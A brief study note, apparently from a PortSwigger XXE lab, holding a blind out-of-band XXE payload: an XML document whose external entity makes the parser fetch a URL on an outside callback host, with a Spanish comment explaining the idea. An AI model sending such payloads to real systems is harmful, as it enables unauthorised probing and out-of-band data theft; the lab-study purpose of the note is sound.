Tags: #XXE #PortSwigger 

# Lab 3 Blind XXE-OOB (with Out-of-band) 

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://if1uhmffypde.otify.com/testXXE">]>      
	<root>
		&xxe;
	</root>

	<!-- OOB = Poder colocar una URL externa y tratar de cargar un recurso -->
```